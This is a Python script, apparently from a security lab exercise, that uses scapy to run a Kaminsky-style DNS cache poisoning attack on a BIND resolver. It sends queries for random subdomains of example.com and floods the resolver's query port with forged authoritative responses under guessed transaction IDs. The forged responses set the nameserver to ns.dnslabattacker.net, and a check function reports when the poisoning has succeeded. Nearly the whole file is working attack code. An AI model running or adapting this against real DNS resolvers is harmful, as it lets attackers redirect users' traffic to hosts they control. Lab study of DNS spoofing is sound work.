#!/usr/bin/env python
import argparse
import socket

from scapy.all import *
from random import randint, choice, sample
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 16-bit integer.
'''
def getRandomTXID(num=None):
        if num is None:
	    return randint(0, 65535)
        else:
            return sample(range(65535), num)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

def checkIfHacked(sock):
    dnsPacket = DNS(rd = 1, qd=DNSQR(qname='example.com'))
    sendPacket(sock, dnsPacket, my_ip, my_port)
    response, addr = sock.recvfrom(4096)
    response = DNS(response)

    if response[DNS].ns[DNSRR][0].rdata == "ns.dnslabattacker.net.":
        return True
    else:
        return False
'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
    print dnsPacket.show()
    sendPacket(sock, dnsPacket, my_ip, my_port)
    response = sock.recv(4096)
    
    response = DNS(response)
    response.show()
    print('id:', type(response.id))
    print('an:', type(response.an))
    print('qd:', type(response.qd))
    print('ns:', type(response.ns))
    print('aa:', type(response.aa))
    print('ar:', type(response.ar))

    response.id = getRandomTXID()
    response.an.rdata = "1.2.3.4"
    #response.qd.qname = 'example.com'
    #response.an.rrname = 'example.com'
    response.ns[0].rrname = 'example.com.'
    response.ns[1].rrname = 'example.com.'

    response.ns[0].rdata = "ns.dnslabattacker.net."
    response.ns[1].rdata = "ns.dnslabattacker.net."
    response.aa = 1
    response.ar = None
    response.arcount = 0

    #response = DNS(id = getRandomTXID(), an = DNSRR(rdata = '1.2.3.4'), qd = DNSQR(qname = 'example.com'), \
    #               ns = DNSRR(rrname = 'example.com', rdata = 'ns.dnslabattacker.net'), aa=1)
    #dns_qd = DNSQR(qname=)

    print(type(response.ns))
    print "\n***** Packet Received from Remote Server *****"
    print response.show()
    print "***** End of Remote Server Packet *****\n"

    NUM_PAK = 50
    #raise ValueError()
    import time
    flag = True
    while True:
        random_domain_name = getRandomSubDomain()
        fake_domain_name = random_domain_name + '.example.com.'
        dnsPacket.qd.qname = random_domain_name + '.example.com'
        response.qd.qname = fake_domain_name
        response.an.rrname = fake_domain_name

        sendPacket(sock, dnsPacket, my_ip, my_port)
        for i in range(NUM_PAK):
            response.id = getRandomTXID()
            sendPacket(sock, response, my_ip, my_query_port)
        if flag:
            dnsPacket.show()
            response.show()
            flag = False
        if checkIfHacked(sock):
            print('success!!')
if __name__ == '__main__':
    exampleSendDNSQuery()
